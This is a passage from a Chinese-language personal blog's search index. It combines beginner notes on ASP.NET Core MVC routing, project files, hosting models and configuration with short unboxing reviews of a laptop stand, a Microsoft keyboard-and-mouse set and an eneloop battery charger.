Index() { var model = _dogRepostory.GetAllDogs(); return View(model); } [Route(\"[action]/{id?}\")] public IActionResult Details(int? id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id??1), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } } } 在更精簡方法 using Microsoft.AspNetCore.Mvc; using WebApplication3.Models; using WebApplication3.ViewModels; namespace WebApplication3.Controllers { [Route(\"[controller]/[action]\")] public class HomeController : Controller { private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } [Route(\"~/\")] [Route(\"~/Home\")] public IActionResult Index() { var model = _dogRepostory.GetAllDogs(); return View(model); } [Route(\"{id?}\")] public IActionResult Details(int? id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id??1), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } } } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:23:1","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"實戰中還是用… Startup.cs app.UseMvc(routes =\u003e { routes.MapRoute(\"default\", \"{controller=Home}/{action=Index}/{id?}\"); }); ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:23:2","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"總結 仔細再回來看這篇，這邊已經把剛入手要會的東西。再有相關程式經驗學習 Net Core 也是可以很快上手，再搭配 Visual Studio 智慧提示，你可以很快撰寫程式碼，也可以知道程式哪裡錯。 Net Core的 View 真的讓我滿經驗，在我學 Laravel 和 Spring Boot 的 View 時候，編譯器無法判別哪邊有寫錯誤(也可能我不會設定🤣)，Visual Studio 就可以做到。在寫 View 時候有些沒有判斷到都可以早點發現。後面我工作是做純後端，所以平常是不寫 View，但我會建議去了解它怎麼使用。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:24:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"做為本篇 Net Core 第一篇筆記，這邊記錄Visual Studio 建立專案一些事情。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:0:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"建置專案 這邊修改方案、專案名稱。這邊要注意，1個方案可以有很多專案。每一個專案下面只有一個 Program.cs 程式，這邊我目前得知預設好像沒有像 Java 一樣可以設定很多 main 方法。 這邊可以針對設定做調整。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:1:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"一些知識 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:2:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":".csproj .csproj 是根據程式語言的設定檔所使用。一開始接副檔名還滿長的，但其實就是cs、project縮寫。 Note C# 副檔名是 cs。 在專案右鍵點點選編輯專案檔或點專案兩下也可以進去修改文件。 這邊我在後期研究發現這個跟專案有關係，當沒有這個的話，Visual Studio 無法讀到這區程式路徑。 發現原因 我之前使用 OpenAPI 產生 Code，發現沒有 csproj 是沒辦法用 Visual Studio 打開的，後來我發現我用到廢棄的 Code Generate，所以才沒正常產生出來… 我後來更深入了解這個跟 MS Build 有關係，有空再升入研究。 使用 MSBuild - MSBuild | Microsoft Learn 使用 MSBuild 建置方案檔(sln)與建置專案檔(csproj)的陷阱與注意事項 | The Will Will Web Jenkins 搭配MSBuild 建置與發佈 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:2:1","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"針對 csproj 檔案 TargetFramework 在應用程式中指定你的目標框架(TargetFramework)。 指定目標版本需要用TargetFrameworkMoniker(TFM)。 AspNetCoreHostingModel 指定應用程式的託管形式。 有兩種: InProcess OutOfProcess ASP.NET Core 預設採用InProcess託管。 最新版我看文件好像採用OutOfProcess，詳細使用 IIS 和 ASP.NET Core 進行跨進程裝載 | Microsoft Docs文章。 也可以看老 ASP.NET Core 程式的 IIS InProcess 模式設定問題-黑暗執行緒。 InProcess InProcess 是指 ISS 程式(w3wp.exe)中託管我們的 ASP.NET Core應用程式。 OutOfProcess Web請求轉發到後端 ASP.NET Core 中，而整個應用程式運行在 ASP.NET Core 中內置的 Kestrel 中。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:2:2","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"PackageReference 用於包含對應應用程式安裝的 nuget 包的引用。 Metapackage(綜合包) - Microsoft.AspNetCore.App Metapackage 本身沒有任何內容。 Microsoft.AspNetCore.App 不需要指版本。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:2:3","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"Main (Web)主程式撰寫 Program.cs =\u003e Startup.cs 重點有兩個設定。 註冊 DI 設定 Middleware 地方 這邊先不細談。 CreateDefaultBuilder() 執行的一些任務 設置 Web 服務器 加載主機和應用程式配置表訊息 配置日誌(log)記錄 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:3:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"Hello world 測試 public void Configure(IApplicationBuilder app, IWebHostEnvironment env) { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); } app.Run(async (context) =\u003e { await context.Response.WriteAsync(\"Hello world!\"); }); } ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:3:1","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"WriteAsync 未定義 .net core WriteAsync 方法未定义_已解决_博问_博客园 c# - How to print process name in StartUp.cs for .net core 3.1 - Stack Overflow 程式碼上面加下面這段就可以了。 using Microsoft.AspNetCore.Http; 不過還滿迷的，有空來研究為什麼。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:3:2","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"InProcess 託管 \u003cAspNetCoreHostingModel\u003eInProcess\u003c/AspNetCoreHostingModel\u003e InProcess 是指 ISS 程式(w3wp.exe or iisexpress.exe)中託管我們的 ASP.NET Core 應用程式。 InProcess 比 OuOfProcess 託管提供了更高的吞吐量。 public void Configure(IApplicationBuilder app, IWebHostEnvironment env) { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); } app.Run(async (context) =\u003e { var processName = System.Diagnostics.Process.GetCurrentProcess().ProcessName; await context.Response.WriteAsync(processName); }); } 可以選擇別的託管 Process.ProcessName Property (System.Diagnostics) | Microsoft Docs ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:4:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"OutOfProcess 有2個 Web 服務器 - 內部 Web 服務器和外部 Web 服務器。 內部 Web 服務器是 Kestrel。 外部 Web 服務器呵以是ISS，Nginx或Apache。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:5:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"什麼是 Kestrel Web Server? Kestrel 是ASP.NET Core 的跟平台WEB服務器 Kestrel本身可以用作邊綠服務器 Kestrel 中用於託管應用程式的進程是dotnet.exe。 可參考: 8.ASP.NET Core中的Kestrel Web服务器 - 灰太狼的梦想 - 博客园 ASP.NET Core 托管和部署(一)【Kestrel】_风神修罗使的博客-CSDN博客_kestrel 部署 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:5:1","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"預設 Port ISS: 3290 DOTNET: 5000 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:6:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"LaunchSetting.json 在 Properties 底下設定。 原始碼參考 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:7:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"環境變數 ASP.NET Core 中的設定來源： appsettings.json,appsettings.Environment.json 不同環境下對應不同的主機環境 User Secrets(用戶機密) Environment variables Command line arguments(命令參數) 以上配置順序，後會蓋前。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:8:0","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"appSettings.json 可以依照還境變數ASPNETCORE_ENVIRONMENT來改變裡面設定的值。 { \"Logging\": { \"LogLevel\": { \"Default\": \"Information\", \"Microsoft.AspNetCore\": \"Warning\" } }, \"AllowedHosts\": \"*\" } ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:8:1","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"User Secrets ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:8:2","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"設定環境變數 ASPNETCORE_ENVIRONMENT=Development這邊設定可以看出會指定 ASPNETCORE_ENVIRONMENT 環境變數套用在 ASP.NET Core 上面。 ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:8:3","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":[".Net Core"],"content":"command line argument dotnet run CustomText \"Hello World in command line argument\" ","date":"2022-11-29","objectID":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/:8:4","tags":[".netcore","Visual Studio","csproj"],"title":"第一次使用 Visual Studio 2022 創建 Net Core 專案和技術名詞小記","uri":"/blog/posts/Net-Core-%E5%89%B5%E5%BB%BA%E5%B0%88%E6%A1%88/"},{"categories":["隨意開箱"],"content":"最近再找穩固能放我兩公斤的電腦，想固定放在辦公室，所以無次找穩定的，這次開箱體積滿大，但她可以承重 10 kg，使用覺得還滿穩固的，所以就決定買它了。 ","date":"2022-11-21","objectID":"/blog/posts/Kavalan-%E7%AD%86%E9%9B%BB%E5%8F%AF%E8%AA%BF%E5%8D%87%E6%9E%B6%E5%AD%90%E9%96%8B%E7%AE%B1/:0:0","tags":["架子","kavalan"],"title":"Kavalan 筆電可調升架子開箱","uri":"/blog/posts/Kavalan-%E7%AD%86%E9%9B%BB%E5%8F%AF%E8%AA%BF%E5%8D%87%E6%9E%B6%E5%AD%90%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 體積還滿大，重量也不輕，帶回去還滿不方便，最好準備帶個大袋子來買。 背面可以看到有寫承重有 10 KG，後續就是開箱不廢話。 ","date":"2022-11-21","objectID":"/blog/posts/Kavalan-%E7%AD%86%E9%9B%BB%E5%8F%AF%E8%AA%BF%E5%8D%87%E6%9E%B6%E5%AD%90%E9%96%8B%E7%AE%B1/:1:0","tags":["架子","kavalan"],"title":"Kavalan 筆電可調升架子開箱","uri":"/blog/posts/Kavalan-%E7%AD%86%E9%9B%BB%E5%8F%AF%E8%AA%BF%E5%8D%87%E6%9E%B6%E5%AD%90%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"結論 因為我是在辦公室用，在光華商場也不好找這種商品，有在一間店看到在賣，售價900元，我看是比 PChome 便宜，正面調升自由度還滿不錯，我在光華附近某一家店的店員也有在用，後來就決定買這個東西。 話說我原本是要找我同事買的筆電架子，但是找不太到，最後問她哪裡買，沒想到在蝦皮可以買，而且價格只要359元，想要攜帶方便的話也可以考慮這個東西，我覺得也不會太差啦。 🔥二代陽極氧化🔥筆記型電腦支架 平板支架 平板電腦支架 筆電散熱支架 六檔調節 電腦架 寬度可調節 鋁合金筆電支架 | 蝦皮購物 開箱文沒例外這篇應該是最後了，最近買太多東西，最近累積 Net Core 文章也快 100 多篇，該準備移轉相關筆記到這邊，希望我還有力氣做個整理😅。 ","date":"2022-11-21","objectID":"/blog/posts/Kavalan-%E7%AD%86%E9%9B%BB%E5%8F%AF%E8%AA%BF%E5%8D%87%E6%9E%B6%E5%AD%90%E9%96%8B%E7%AE%B1/:2:0","tags":["架子","kavalan"],"title":"Kavalan 筆電可調升架子開箱","uri":"/blog/posts/Kavalan-%E7%AD%86%E9%9B%BB%E5%8F%AF%E8%AA%BF%E5%8D%87%E6%9E%B6%E5%AD%90%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"最近工作需求，辦公室需要一組鍵盤滑鼠，這邊看了這麼多的不知道要買什麼鍵盤放在公司，不買機械式鍵盤放在公司，怕吵到同事😂，也不太想買太大鍵盤和接收器很大之類，原本想看看羅技品牌鍵盤滑鼠，但看到預算會遭過我 2000 元的預算，然後看到微軟鍵盤滑鼠竟然有 Office 快捷鍵，那就買買增加工作效率的鍵盤吧。其實後面想想這也是一個噱頭，哈哈🤣。 ","date":"2022-11-15","objectID":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/:0:0","tags":["鍵盤","滑鼠"],"title":"Microsoft 微軟精巧藍芽鍵盤滑鼠組 開箱","uri":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"購買契機 再找哪個滑鼠比較好用，後來看到一個滑鼠推薦影片，這邊我突然找不到那個影片。看到微軟Microsoft Designer Desktop Keyboard，但網路售價都要 2000~3000 元，2000多的標榜有藍芽4，但接近3000多的有標榜藍芽5，藍芽5這邊都是看網頁有提到，但包裝偷沒提到…這邊就不知道是不是一樣東西。但還是超出我要的預算，而且他那個鍵盤壓縮會不會影響手感也不太確定，這邊有找到一般版，看到售價快 2000 元，有搭配鍵盤滑鼠，最後在博客來看到有 1500 元就能買到鍵盤滑鼠組，滑鼠單買也要 500 多，雖然公司打算用小米靜音滑鼠🤐，他沒有上下一頁快速鍵，我又不想多花出預算，所以就打算這樣配置。 ","date":"2022-11-15","objectID":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/:1:0","tags":["鍵盤","滑鼠"],"title":"Microsoft 微軟精巧藍芽鍵盤滑鼠組 開箱","uri":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"小知識與提醒 這鍵盤沒有2.4G無線，只支援藍芽4以上 這鍵盤沒有2.4G無線，只支援藍芽4以上 這鍵盤沒有2.4G無線，只支援藍芽4以上 聽說藍芽版本都不能用，聽說藍芽4有支援比較省電功能，但有沒有比2.4G無線省電就不知道。 這邊在提醒，假如是桌上型電腦的話，你可能需要2.4G無限，原因是當想進去開機時候，2.4G無線鍵盤可以按下Delete進 BIOS，這部分可能要注意喔，因為我是用在鍵盤上面，所以沒有這個需求。 ","date":"2022-11-15","objectID":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/:2:0","tags":["鍵盤","滑鼠"],"title":"Microsoft 微軟精巧藍芽鍵盤滑鼠組 開箱","uri":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 廠商出貨，送一個鍵盤裡面包很多碰撞氣泡袋子，我覺得很用心。 這邊可以看得出來包裝很細心，這邊你不需要用美工刀割開，這邊撕掉就能開了。 微軟 Emoji 鍵盤。 我之前有買過微軟鍵盤觸控板，所以我這邊有想要買來試試。這邊拍個大小比較圖。鍵盤滿塑膠感很重，很排斥的話不推薦買，我之前有買過微軟鍵盤，所以我是知道這點的。 ","date":"2022-11-15","objectID":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/:3:0","tags":["鍵盤","滑鼠"],"title":"Microsoft 微軟精巧藍芽鍵盤滑鼠組 開箱","uri":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"說明書 說明書沒看到藍芽5標誌，後來也沒找到測試裝置有沒有藍芽版本查詢方法。 中文說明書1 中文說明書2 中文說明書3 產品規格1 產品規格2 ","date":"2022-11-15","objectID":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/:4:0","tags":["鍵盤","滑鼠"],"title":"Microsoft 微軟精巧藍芽鍵盤滑鼠組 開箱","uri":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"結論 假如你不在意金屬材質鍵盤，不排斥塑膠鍵盤，需要一般樸素鍵盤的話，我很推薦這個。之前我在保哥好像有推薦微軟鍵盤，他好像說滿不錯樣子，沒記錯的話😅。 滑鼠，我懶得開箱。有稍微按過滑鼠，真響亮的聲音，但其實是一般滑鼠聲音，因為我用小米靜音滑鼠很久了，所以感覺非常明顯，他上面沒有回上下一頁功能，藍芽有沒有比較省電，這部分我就沒辦法測試。滑鼠我就不推薦了。 ","date":"2022-11-15","objectID":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/:5:0","tags":["鍵盤","滑鼠"],"title":"Microsoft 微軟精巧藍芽鍵盤滑鼠組 開箱","uri":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"彩蛋 [已解決]羅技的接收器不是可以一個接收器同時使用在滑鼠和鍵盤嗎 ? - Mobile01 無線滑鼠/鍵盤接收器不見了怎麼辦?簡單配對立刻搞定！ (Logitech羅技) - 高橋太太好吃驚 (@TakahashiKiKi) ","date":"2022-11-15","objectID":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/:6:0","tags":["鍵盤","滑鼠"],"title":"Microsoft 微軟精巧藍芽鍵盤滑鼠組 開箱","uri":"/blog/posts/Microsoft-%E5%BE%AE%E8%BB%9F%E7%B2%BE%E5%B7%A7%E8%97%8D%E8%8A%BD%E9%8D%B5%E7%9B%A4%E6%BB%91%E9%BC%A0%E7%B5%84-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"最近有充電電池需求，原本舊的充電器想帶到公司去，所以就打算買新的，打算買 eneloop 官方的充電器。這邊要注意，我發現我以前買的三洋充電器不是 eneloop 原廠的，因為在 PChome 看到跟 eneloop 原廠一起賣的，所以這邊要注意一下。 ","date":"2022-11-13","objectID":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/:0:0","tags":["充電器","eneloop"],"title":"Panasonic BQ CC17TW eneloop 開箱","uri":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"開箱 這個是去光華買的，搭配電池一起買買的。光華買會比較便宜，一般3A eneloop 四個電池要 390，最後有看到一間 350。BQ-CC17TW充電器有490，不過有些店買不到，好像都被拿光了，真的很誇張。最後看到有 830 他配憶起賣，所以就順便一起買。 之前買的三洋充電器比較一下，發現還是有差。三洋充電器 eneloop放進去要拔起來不是很好拔，但 Panasonic 斜斜放，不是直立進去，但這樣很好拔，我還滿喜歡這個設計。 順便兩邊規格對照一下。 三洋充電一定要兩個兩個衝，所以它下面有兩個燈。Panasonic 充電器是獨立的，這個看起來可以一個一個充電，他說明書有寫到可以混充大小電池。 充滿電燈會熄掉。 ","date":"2022-11-13","objectID":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/:1:0","tags":["充電器","eneloop"],"title":"Panasonic BQ CC17TW eneloop 開箱","uri":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"說明書 中文說明書 ","date":"2022-11-13","objectID":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/:2:0","tags":["充電器","eneloop"],"title":"Panasonic BQ CC17TW eneloop 開箱","uri":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"小心買到假貨 在官方有看到買的時候需要注意的事情，需要注意有沒有恆隆行貿易股份有限公司字樣，寫這篇 相關連結可以看 小心假貨貼文 相關文章回復貼文商品 ","date":"2022-11-13","objectID":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/:3:0","tags":["充電器","eneloop"],"title":"Panasonic BQ CC17TW eneloop 開箱","uri":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"總結 充電器真的有比三洋好，從取下電池這邊就給予高評價，三洋有時拔下小電池真的需要工具，可能還會造成電池刮傷，這邊推薦買原廠充電座。 ","date":"2022-11-13","objectID":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/:4:0","tags":["充電器","eneloop"],"title":"Panasonic BQ CC17TW eneloop 開箱","uri":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"2023-02-23 今天滑鼠用到一半突然沒訊號，發現滑鼠沒有亮，就把電池拿去充電。結果衝很久綠燈都沒有消失。後來拔掉重開就開始閃綠燈…，這邊爬文發現是電池壽命沒了。這邊可能要留意。 可參考:eneloop - 貼文 | Facebook ","date":"2022-11-13","objectID":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/:5:0","tags":["充電器","eneloop"],"title":"Panasonic BQ CC17TW eneloop 開箱","uri":"/blog/posts/Panasonic-BQ-CC17TW-eneloop-%E9%96%8B%E7%AE%B1/"},{"categories":["隨意開箱"],"content":"最近想找一個可以直立充電，最近雙十一特價就打算買買看，雖然我最近沒有換手機，現行手機無線充電速度應該也沒有辦法這麼快，不過先買回來用用看。 ","date":"2022-11-09","objectID":"/blog/posts/50W-%E5%B0%8F%E7%B1%B3%E7%9B%B4%E7%AB%8B%E9%A2%A8%E5%86%B7%E7%84%A1%E7%B7%9A%E5%85%85%E9%9B%BB%E5%BA%A7%E9%96%8B%E7%AE%B1/:0:0","tags":["mi"],"title":"50W 